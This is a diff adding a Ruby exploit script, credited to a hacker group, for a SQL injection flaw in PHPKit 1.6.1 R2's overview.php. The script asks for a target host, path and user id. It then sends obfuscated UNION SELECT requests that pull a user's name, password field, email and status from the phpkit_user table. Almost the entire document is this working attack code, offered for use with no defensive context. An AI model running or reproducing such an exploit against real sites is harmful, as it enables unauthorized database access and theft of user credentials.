@@ -1,0 +1,104 @@
+----------------------------Information------------------------------------------------
++Name : PHPKit <= 1.6.1 R2 overview.php SQL injection Vulnerability Exploit
++Autor : Easy Laster
++Date   : 22.10.2010
++Script  : PHPKit 1.6.1 R2
++Price : free
++Language : PHP
++Discovered by Easy Laster
++Security Group 4004-Security-Project
++Greetz to Team-Internet ,Underground Agents and free-hack.com
++And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok,
+Kiba,-tmh-,Dr.ChAoS,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge,
+N00bor,Ic3Drag0n,novaca!ne,n3w7u,Maverick010101,s0red,c1ox,enco,
+ 
+---------------------------------------------------------------------------------------
+                                                                                      
+ ___ ___ ___ ___                         _ _           _____           _         _  
+| | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_
+|_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|
+  |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_| 
+                                              |___|                 |___|           
+ 
+ 
+----------------------------------------------------------------------------------------
+#!/usr/bin/ruby
+#4004-security-project.com
+#Discovered and vulnerability by Easy Laster
+print "
+#########################################################
+#                    4004-Security-Project              #
+#########################################################
+#         PhPkit 1.6.1 RC 2 SQL Injection overview.php  #
+#                          Exploit                      #
+#                     Using Host+Path+id                #
+#                     www.demo.de /forum/ 1             #
+#                         Easy Laster                   #
+#########################################################
+"
+require 'net/http'
+block = "#########################################################"
+print ""+ block +""
+print "\nEnter host name (site.com)->"
+host=gets.chomp
+print ""+ block +""
+print "\nEnter script path (/forum/)->"
+path=gets.chomp
+print ""+ block +""
+print "\nEnter the id (id)->"
+userid=gets.chomp
+print ""+ block +""
+begin
+dir =  "include.php/?path=content/overview.php&type=&letter=%27+/**/u"+
+       "NiOn+/**/sElEcT+/**/1,2,3,concat(0x23,0x23,0x23,0x23,0x23,use"+
+       "r_id,0x23,0x23,0x23,0x23,0x23),5,6,7,8,9,10,11,12,13,14,15,16"+
+       ",17,18,19,20,21,22,23,24,25,26/**/+FrOm/**/+phpkit_user/**/+W"+
+       "HERE+/**/user_id="+ userid +"--+"+"&catid=&themeid=&searchtex"+
+       "t=&entries=0&order="
+       http = Net::HTTP.new(host, 80)
+       resp= http.get(path+dir)
+       print "\nUserid -> "+(/#####(.+)#####/).match(resp.body)[1]
+       
+           dir =  "include.php/?path=content/overview.php&type=&letter=%27"+
+           "+/**/uNiOn+/**/sElEcT+/**/1,2,3,concat(0x23,0x23,0x23,0x23,0x2"+
+           "3,user_name,0x23,0x23,0x23,0x23,0x23),5,6,7,8,9,10,11,12,13,14"+
+           ",15,16,17,18,19,20,21,22,23,24,25,26/**/+FrOm/**/+phpkit_user/"+
+           "**/+WHERE+/**/user_id="+ userid +"--+"+"&catid=&themeid=&searc"+
+           "htext=&entries=0&order="
+           http = Net::HTTP.new(host, 80)
+           resp= http.get(path+dir) 
+           print "\nUsername -> "+(/#####(.+)#####/).match(resp.body)[1]
+
+             dir =  "include.php/?path=content/overview.php&type=&letter=%27+"+
+             "/**/uNiOn+/**/sElEcT+/**/1,2,3,concat(0x23,0x23,0x23,0x23,0x23,"+
+             "user_pw,0x23,0x23,0x23,0x23,0x23),5,6,7,8,9,10,11,12,13,14,15,1"+
+             "6,17,18,19,20,21,22,23,24,25,26/**/+FrOm/**/+phpkit_user/**/+WH"+
+             "ERE+/**/user_id="+ userid +"--+"+"&catid=&themeid=&searchtext=&"+
+             "entries=0&order="
+             http = Net::HTTP.new(host, 80)
+             resp= http.get(path+dir) 
+             print "\nPassword -> "+(/#####(.+)#####/).match(resp.body)[1]
+
+          dir =  "include.php/?path=content/overview.php&type=&letter=%27+/"+
+          "**/uNiOn+/**/sElEcT+/**/1,2,3,concat(0x23,0x23,0x23,0x23,0x23,us"+
+          "er_email,0x23,0x23,0x23,0x23,0x23),5,6,7,8,9,10,11,12,13,14,15,1"+
+          "6,17,18,19,20,21,22,23,24,25,26/**/+FrOm/**/+phpkit_user/**/+WHE"+
+          "RE+/**/user_id="+ userid +"--+"+"&catid=&themeid=&searchtext=&en"+
+          "tries=0&order="
+          http = Net::HTTP.new(host, 80)
+          resp= http.get(path+dir) 
+          print "\nEmail -> "+(/#####(.+)#####/).match(resp.body)[1]
+
+       dir =  "include.php/?path=content/overview.php&type=&letter=%27+/*"+
+       "*/uNiOn+/**/sElEcT+/**/1,2,3,concat(0x23,0x23,0x23,0x23,0x23,user"+
+       "_status,0x23,0x23,0x23,0x23,0x23),5,6,7,8,9,10,11,12,13,14,15,16,"+
+       "17,18,19,20,21,22,23,24,25,26/**/+FrOm/**/+phpkit_user/**/+WHERE+"+
+       "/**/user_id="+ userid +"--+"+"&catid=&themeid=&searchtext=&entrie"+
+       "s=0&order="
+       http = Net::HTTP.new(host, 80)
+       resp= http.get(path+dir) 
+       print "\nUser Status -> "+(/#####(.+)#####/).match(resp.body)[1]
+    print "\n#########################################################"
+ rescue
+print "\nExploit failed or Hackblock"
+end
